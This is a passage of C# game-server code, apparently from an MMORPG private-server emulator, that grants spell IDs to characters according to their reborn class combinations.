                        client.AddSpell(new Spell(true) { ID = 1350 });//DivineHare
                        client.AddSpell(new Spell(true) { ID = 1280 });//Water Elf
                    }
                    else if (client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                        client.AddSpell(new Spell(true) { ID = 1085 });//StarOfAccuracy
                        client.AddSpell(new Spell(true) { ID = 1090 });//MagicShield
                        client.AddSpell(new Spell(true) { ID = 1095 });//Stigma
                        client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                        client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                        client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                    }
                    else if (client.Entity.Class == 21)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });//
                        client.AddSpell(new Spell(true) { ID = 1085 });//
                        client.AddSpell(new Spell(true) { ID = 1090 });//
                        client.AddSpell(new Spell(true) { ID = 1095 });//
                        client.AddSpell(new Spell(true) { ID = 1195 });//
                        client.AddSpell(new Spell(true) { ID = 1190 });//
                        client.AddSpell(new Spell(true) { ID = 1110 });//
                        client.AddSpell(new Spell(true) { ID = 1270 });//
                        client.AddSpell(new Spell(true) { ID = 5100 });//
                    }
                    else if (client.Entity.Class == 11)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });//
                        client.AddSpell(new Spell(true) { ID = 1085 });//
                        client.AddSpell(new Spell(true) { ID = 1090 });//
                        client.AddSpell(new Spell(true) { ID = 1095 });//
                        client.AddSpell(new Spell(true) { ID = 1195 });//
                        client.AddSpell(new Spell(true) { ID = 3050 });//
                    }
                }
                #endregion
                #region Water-War
                if (client.Entity.FirstRebornClass == 135 && client.Entity.SecondRebornClass == 25)
                {

                    if (client.Entity.Class == 41)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });//
                        client.AddSpell(new Spell(true) { ID = 1085 });//
                        client.AddSpell(new Spell(true) { ID = 1090 });//
                        client.AddSpell(new Spell(true) { ID = 1095 });//
                        client.AddSpell(new Spell(true) { ID = 1195 });//
                        client.AddSpell(new Spell(true) { ID = 1020 });//
                        client.AddSpell(new Spell(true) { ID = 1040 });//
                        client.AddSpell(new Spell(true) { ID = 3060 });//
                        client.AddSpell(new Spell(true) { ID = 1350 });//
                        client.AddSpell(new Spell(true) { ID = 1280 });//
                    }
                    else if (client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });//
                        client.AddSpell(new Spell(true) { ID = 1085 });//
                        client.AddSpell(new Spell(true) { ID = 1090 });//
                        client.AddSpell(new Spell(true) { ID = 1095 });//
                        client.AddSpell(new Spell(true) { ID = 1195 });//
                        client.AddSpell(new Spell(true) { ID = 1020 });//
                        client.AddSpell(new Spell(true) { ID = 1040 });//
                        client.AddSpell(new Spell(true) { ID = 3060 });//
                    }
                    else if (client.Entity.Class == 11 || client.Entity.Class == 51 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });//
                        client.AddSpell(new Spell(true) { ID = 1085 });//
                        client.AddSpell(new Spell(true) { ID = 1090 });//
                        client.AddSpell(new Spell(true) { ID = 1095 });//
                        client.AddSpell(new Spell(true) { ID = 1195 });//
                        client.AddSpell(new Spell(true) { ID = 1015 });//
                        client.AddSpell(new Spell(true) { ID = 1040 });//
                        client.AddSpell(new Spell(true) { ID = 3060 });//
                        client.AddSpell(new Spell(true) { ID = 1320 });//
                    }
                    else if (client.Entity.Class == 61)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });//
                        client.AddSpell(new Spell(true) { ID = 1085 });//
                        client.AddSpell(new Spell(true) { ID = 1090 });//
                        client.AddSpell(new Spell(true) { ID = 1095 });//
                        client.AddSpell(new Spell(true) { ID = 1195 });//
                        client.AddSpell(new Spell(true) { ID = 1015 });//
                        client.AddSpell(new Spell(true) { ID = 1040 });//
                        client.AddSpell(new Spell(true) { ID = 3060 });//
                        client.AddSpell(new Spell(true) { ID = 1320 });//
                        client.AddSpell(new Spell(true) { ID = 1350 });//DivineHare
                        client.AddSpell(new Spell(true) { ID = 1280 });//Water Elf
                    }
                    else if (client.Entity.Class == 21)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });//
                        client.AddSpell(new Spell(true) { ID = 1085 });//
                        client.AddSpell(new Spell(true) { ID = 1090 });//
                        client.AddSpell(new Spell(true) { ID = 1095 });//
                        client.AddSpell(new Spell(true) { ID = 1195 });//
                        client.AddSpell(new Spell(true) { ID = 3060 });//
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });//
                        client.AddSpell(new Spell(true) { ID = 1085 });//
                        client.AddSpell(new Spell(true) { ID = 1090 });//
                        client.AddSpell(new Spell(true) { ID = 1095 });//
                        client.AddSpell(new Spell(true) { ID = 1195 });//
                        client.AddSpell(new Spell(true) { ID = 1020 });//
                        client.AddSpell(new Spell(true) { ID = 1040 });//
                        client.AddSpell(new Spell(true) { ID = 3060 });//
                        client.AddSpell(new Spell(true) { ID = 1025 });//
                    }
                }
                #endregion
                #region Water-Water
                if (client.Entity.FirstRebornClass == 135 && client.Entity.SecondRebornClass == 135)
                {

                    if (client.Entity.Class == 11 || client.Entity.Class == 21 || client.Entity.Class == 41 || client.Entity.Class == 51 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });//
                        client.AddSpell(new Spell(true) { ID = 1085 });//
                        client.AddSpell(new Spell(true) { ID = 1090 });//
                        client.AddSpell(new Spell(true) { ID = 1095 });//
                        client.AddSpell(new Spell(true) { ID = 1195 });//
                        client.AddSpell(new Spell(true) { ID = 3090 });//
                    }
                    else if (client.Entity.Class == 61)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1005 });//
                        client.AddSpell(new Spell(true) { ID = 1085 });//
                        client.AddSpell(new Spell(true) { ID = 1090 });//
                        client.AddSpell(new Spell(true) { ID = 1095 });//
                        client.AddSpell(new Spell(true) { ID = 1195 });//
                        client.AddSpell(new Spell(true) { ID = 3090 });//
                        client.AddSpell(new Spell(true) { ID = 1350 });//DivineHare
                        client.AddSpell(new Spell(true) { ID = 1280 });//Water Elf
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 3090 });//
                        client.AddSpell(new Spell(true) { ID = 30000 });//Azure Shield
                    }
                    else if (client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1050 });//
                        client.AddSpell(new Spell(true) { ID = 1075 });//Invisibility
                        client.AddSpell(new Spell(true) { ID = 1055 });//
                        client.AddSpell(new Spell(true) { ID = 1175 });//
                        client.AddSpell(new Spell(true) { ID = 3090 });//
                    }
                }

                #endregion
                #region Water-Nin
                if (client.Entity.FirstRebornClass == 135 && client.Entity.SecondRebornClass == 55)
                {
                    client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    client.AddSpell(new Spell(true) { ID = 1005 });//
                    client.AddSpell(new Spell(true) { ID = 1085 });//
                    client.AddSpell(new Spell(true) { ID = 1090 });//
                    client.AddSpell(new Spell(true) { ID = 1095 });//
                    client.AddSpell(new Spell(true) { ID = 1195 });//
                    client.AddSpell(new Spell(true) { ID = 6001 });//
                }
                #endregion
                #region Water-Monk
                if (client.Entity.FirstRebornClass == 135 && client.Entity.SecondRebornClass == 65)
                {
                    client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                    client.AddSpell(new Spell(true) { ID = 1085 });//Star of Accuracy
                    client.AddSpell(new Spell(true) { ID = 1090 });//Magic Shield
                    client.AddSpell(new Spell(true) { ID = 1095 });//Stigma
                    client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                    client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                }
                #endregion
                #region Water-Pirate
                if (client.Entity.FirstRebornClass == 135 && client.Entity.SecondRebornClass == 75)
                {
                    client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                    client.AddSpell(new Spell(true) { ID = 1085 });//Star of Accuracy
                    client.AddSpell(new Spell(true) { ID = 1090 });//Magic Shield
                    client.AddSpell(new Spell(true) { ID = 1095 });//Stigma
                    client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                    client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                }
                #endregion
                #region Water-Brucelee
                if (client.Entity.FirstRebornClass == 135 && client.Entity.SecondRebornClass == 85)
                {
                    client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                    client.AddSpell(new Spell(true) { ID = 1085 });//Star of Accuracy
                    client.AddSpell(new Spell(true) { ID = 1090 });//Magic Shield
                    client.AddSpell(new Spell(true) { ID = 1095 });//Stigma
                    client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                }
                #endregion
                #endregion
                #region Monk2
                #region Monk-Arch
                if (client.Entity.FirstRebornClass == 65 && client.Entity.SecondRebornClass == 45)
                {
                    client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                    client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                }
                #endregion
                #region Monk-Fire
                if (client.Entity.FirstRebornClass == 65 && client.Entity.SecondRebornClass == 145)
                {

                    if (client.Entity.Class == 11 || client.Entity.Class == 21 | client.Entity.Class == 41 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1000 });//Thunder
                        client.AddSpell(new Spell(true) { ID = 1001 });//Fire
                        client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                    }
                    else if (client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1120 });//Fire Circle
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                    }
                    else if (client.Entity.Class == 51)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1085 });//Star of Accuracy
                        client.AddSpell(new Spell(true) { ID = 1090 });//Magic Shield
                        client.AddSpell(new Spell(true) { ID = 1095 });//Stigma
                        client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                    }
                }

                #endregion
                #region Monk-Tro
                if (client.Entity.FirstRebornClass == 65 && client.Entity.SecondRebornClass == 15)
                {
                    client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                    client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                    client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                    client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                }
                #endregion
                #region Monk-War
                if (client.Entity.FirstRebornClass == 65 && client.Entity.SecondRebornClass == 25)
                {

                    if (client.Entity.Class == 41 || client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                        client.AddSpell(new Spell(true) { ID = 1020 });//Shield
                        client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                        client.AddSpell(new Spell(true) { ID = 3060 });//Reflect
                    }
                    else if (client.Entity.Class == 11 || client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                        client.AddSpell(new Spell(true) { ID = 1020 });//Shield
                        client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                        client.AddSpell(new Spell(true) { ID = 3060 });//Reflect
                        client.AddSpell(new Spell(true) { ID = 1320 });//Flying Moon (XP)
                        client.AddSpell(new Spell(true) { ID = 1015 });//Accuracy
                    }
                    else if (client.Entity.Class == 21)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                        client.AddSpell(new Spell(true) { ID = 3060 });//Reflect
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                        client.AddSpell(new Spell(true) { ID = 1020 });//Shield
                        client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                        client.AddSpell(new Spell(true) { ID = 3060 });//Reflect
                        client.AddSpell(new Spell(true) { ID = 1025 });//Superman
                    }
                }
                #endregion
                #region Monk-Water
                if (client.Entity.FirstRebornClass == 65 && client.Entity.SecondRebornClass == 135)
                {

                    if (client.Entity.Class == 11 || client.Entity.Class == 21 || client.Entity.Class == 41 || client.Entity.Class == 51 || client.Entity.Class == 61)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                        client.AddSpell(new Spell(true) { ID = 1020 });//Shield
                        client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                        client.AddSpell(new Spell(true) { ID = 1280 });//Water Elf
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                        client.AddSpell(new Spell(true) { ID = 1015 });//Accuracy
                        client.AddSpell(new Spell(true) { ID = 1350 });//DivineHare
                        client.AddSpell(new Spell(true) { ID = 1095 });//Stigma
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 3090 });//Pervade
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                    }
                    else if (client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                        client.AddSpell(new Spell(true) { ID = 1280 });//Water Elf
                        client.AddSpell(new Spell(true) { ID = 1175 });//dvanced Cure
                        client.AddSpell(new Spell(true) { ID = 1075 });//Invisibility 
                        client.AddSpell(new Spell(true) { ID = 1055 });//Healing Rain
                        client.AddSpell(new Spell(true) { ID = 1050 });//XP Revive
                        client.AddSpell(new Spell(true) { ID = 1350 });//Divine Hare
                    }
                    else if (client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                        client.AddSpell(new Spell(true) { ID = 1020 });//Shield
                        client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                        client.AddSpell(new Spell(true) { ID = 1015 });//Accuracy
                        client.AddSpell(new Spell(true) { ID = 1095 });//Stigma
                    }
                }

                #endregion
                #region Monk-Nin
                if (client.Entity.FirstRebornClass == 65 && client.Entity.SecondRebornClass == 55)
                {
                    if (client.Entity.Class == 51)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                        client.AddSpell(new Spell(true) { ID = 6002 });//PoisonStar
                        client.AddSpell(new Spell(true) { ID = 6001 });//Toxic Fog
                    }
                    else if (client.Entity.Class == 11 || client.Entity.Class == 132 || client.Entity.Class == 21 || client.Entity.Class == 41 || client.Entity.Class == 61 || client.Entity.Class == 142 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                        client.AddSpell(new Spell(true) { ID = 6001 });//Toxic Fog
                    }
                }
                #endregion
                #region Monk-Monk
                if (client.Entity.FirstRebornClass == 65 && client.Entity.SecondRebornClass == 65)
                {

                    if (client.Entity.Class == 11 || client.Entity.Class == 21 || client.Entity.Class == 41 || client.Entity.Class == 51 || client.Entity.Class == 132 || client.Entity.Class == 142 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                    }
                    else if (client.Entity.Class == 61)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 10405 });//soulshackle
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                    }
                }
                #endregion
                #region Monk-Pirate
                if (client.Entity.FirstRebornClass == 65 && client.Entity.SecondRebornClass == 75)
                {
                    client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                    client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                }
                #endregion
                #region Monk-Brucelee
                if (client.Entity.FirstRebornClass == 65 && client.Entity.SecondRebornClass == 85)
                {
                    client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                }
                #endregion
                #endregion
                #region Pirate2
                #region Pirate-Arch
                if (client.Entity.FirstRebornClass == 75 && client.Entity.SecondRebornClass == 45)
                {
                    client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                    client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                }
                #endregion
                #region Pirate-Fire
                if (client.Entity.FirstRebornClass == 75 && client.Entity.SecondRebornClass == 145)
                {

                    if (client.Entity.Class == 11 || client.Entity.Class == 21 | client.Entity.Class == 41 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 51 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1000 });//Thunder
                        client.AddSpell(new Spell(true) { ID = 1001 });//Fire
                        client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                        client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                    }
                    else if (client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1120 });//Fire Circle
                        client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                    }
                }

                #endregion
                #region Pirate-Tro
                if (client.Entity.FirstRebornClass == 75 && client.Entity.SecondRebornClass == 15)
                {
                    client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                    client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                    client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                    client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                }
                #endregion
                #region Pirate-War
                if (client.Entity.FirstRebornClass == 75 && client.Entity.SecondRebornClass == 25)
                {

                    if (client.Entity.Class == 41 || client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                        client.AddSpell(new Spell(true) { ID = 1020 });//Shield
                        client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                        client.AddSpell(new Spell(true) { ID = 3060 });//Reflect
                    }
                    else if (client.Entity.Class == 11 || client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                        client.AddSpell(new Spell(true) { ID = 1020 });//Shield
                        client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                        client.AddSpell(new Spell(true) { ID = 3060 });//Reflect
                        client.AddSpell(new Spell(true) { ID = 1320 });//Flying Moon (XP)
                        client.AddSpell(new Spell(true) { ID = 1015 });//Accuracy
                    }
                    else if (client.Entity.Class == 21)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                        client.AddSpell(new Spell(true) { ID = 3060 });//Reflect
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                        client.AddSpell(new Spell(true) { ID = 1020 });//Shield
                        client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                        client.AddSpell(new Spell(true) { ID = 3060 });//Reflect
                        client.AddSpell(new Spell(true) { ID = 1025 });//Superman
                    }
                }
                #endregion
                #region Pirate-Water
                if (client.Entity.FirstRebornClass == 75 && client.Entity.SecondRebornClass == 135)
                {

                    if (client.Entity.Class == 11 || client.Entity.Class == 21 || client.Entity.Class == 41 || client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                        client.AddSpell(new Spell(true) { ID = 1020 });//Shield
                        client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                        client.AddSpell(new Spell(true) { ID = 1280 });//Water Elf
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                        client.AddSpell(new Spell(true) { ID = 1015 });//Accuracy
                        client.AddSpell(new Spell(true) { ID = 1350 });//DivineHare
                        client.AddSpell(new Spell(true) { ID = 1095 });//Stigma
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 3090 });//Pervade
                        client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                    }
                    else if (client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                        client.AddSpell(new Spell(true) { ID = 1280 });//Water Elf
                        client.AddSpell(new Spell(true) { ID = 1175 });//dvanced Cure
                        client.AddSpell(new Spell(true) { ID = 1075 });//Invisibility 
                        client.AddSpell(new Spell(true) { ID = 1055 });//Healing Rain
                        client.AddSpell(new Spell(true) { ID = 1050 });//XP Revive
                        client.AddSpell(new Spell(true) { ID = 1350 });//Divine Hare
                    }
                }

                #endregion
                #region Pirate-Nin
                if (client.Entity.FirstRebornClass == 75 && client.Entity.SecondRebornClass == 55)
                {
                    if (client.Entity.Class == 51)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                        client.AddSpell(new Spell(true) { ID = 6002 });//PoisonStar
                    }
                    else if (client.Entity.Class == 11 || client.Entity.Class == 132 || client.Entity.Class == 21 || client.Entity.Class == 41 || client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                        client.AddSpell(new Spell(true) { ID = 6001 });//Toxic Fog
                    }
                }
                #endregion
                #region Pirate-Monk
                if (client.Entity.FirstRebornClass == 75 && client.Entity.SecondRebornClass == 65)
                {

                    if (client.Entity.Class == 11 || client.Entity.Class == 21 || client.Entity.Class == 41 || client.Entity.Class == 51 || client.Entity.Class == 132 || client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                    }
                    else if (client.Entity.Class == 61)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 10405 });//soulshackle
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                    }
                    else if (client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                        client.AddSpell(new Spell(true) { ID = 10400 });//Serenity
                    }
                }
                #endregion
                #region Pirate-Pirate
                if (client.Entity.FirstRebornClass == 75 && client.Entity.SecondRebornClass == 75)
                {

                    if (client.Entity.Class == 11 || client.Entity.Class == 21 || client.Entity.Class == 41 || client.Entity.Class == 51 || client.Entity.Class == 132 || client.Entity.Class == 142 || client.Entity.Class == 61 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                    }
                    else if (client.Entity.Class == 71)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                        client.AddSpell(new Spell(true) { ID = 11040 });//Scurvy Bomb
                    }
                }
                #endregion
                #region Pirate-Brucelee
                if (client.Entity.FirstRebornClass == 75 && client.Entity.SecondRebornClass == 85)
                {

                    if (client.Entity.Class == 11 || client.Entity.Class == 21 || client.Entity.Class == 41 || client.Entity.Class == 51 || client.Entity.Class == 132 || client.Entity.Class == 142 || client.Entity.Class == 61 || client.Entity.Class == 71)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 11070 });//Gale Bomb
                    }
                }
                #endregion
                #endregion
                #region Brucelee2
                #region Brucelee-Arch
                if (client.Entity.FirstRebornClass == 85 && client.Entity.SecondRebornClass == 45)
                {
                    client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    client.AddSpell(new Spell(true) { ID = 5002 });//Poisonous Frankos
                }
                #endregion
                #region Brucelee-Fire
                if (client.Entity.FirstRebornClass == 85 && client.Entity.SecondRebornClass == 145)
                {

                    if (client.Entity.Class == 11 || client.Entity.Class == 21 | client.Entity.Class == 41 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 51 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1000 });//Thunder
                        client.AddSpell(new Spell(true) { ID = 1001 });//Fire
                        client.AddSpell(new Spell(true) { ID = 1005 });//Cure
                        client.AddSpell(new Spell(true) { ID = 1195 });//Meditation
                    }
                    else if (client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1120 });//Fire Circle
                    }
                }

                #endregion
                #region Brucelee-Tro
                if (client.Entity.FirstRebornClass == 85 && client.Entity.SecondRebornClass == 15)
                {
                    client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                    client.AddSpell(new Spell(true) { ID = 1190 });//SpiritHealing
                    client.AddSpell(new Spell(true) { ID = 1110 });//Cyclone
                    client.AddSpell(new Spell(true) { ID = 1270 });//Robot
                }
                #endregion
                #region Pirate-War
                if (client.Entity.FirstRebornClass == 85 && client.Entity.SecondRebornClass == 25)
                {

                    if (client.Entity.Class == 41 || client.Entity.Class == 142)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1020 });//Shield
                        client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                        client.AddSpell(new Spell(true) { ID = 3060 });//Reflect
                    }
                    else if (client.Entity.Class == 11 || client.Entity.Class == 51 || client.Entity.Class == 61 || client.Entity.Class == 71 || client.Entity.Class == 81)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 1020 });//Shield
                        client.AddSpell(new Spell(true) { ID = 1040 });//Roar
                        client.AddSpell(new Spell(true) { ID = 3060 });//Reflect
                        client.AddSpell(new Spell(true) { ID = 1320 });//Flying Moon (XP)
                        client.AddSpell(new Spell(true) { ID = 1015 });//Accuracy
                    }
                    else if (client.Entity.Class == 21)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
                        client.AddSpell(new Spell(true) { ID = 3060 });//Reflect
                    }
                    else if (client.Entity.Class == 132)
                    {
                        client.AddSpell(new Spell(true) { ID = 9876 });//Bless
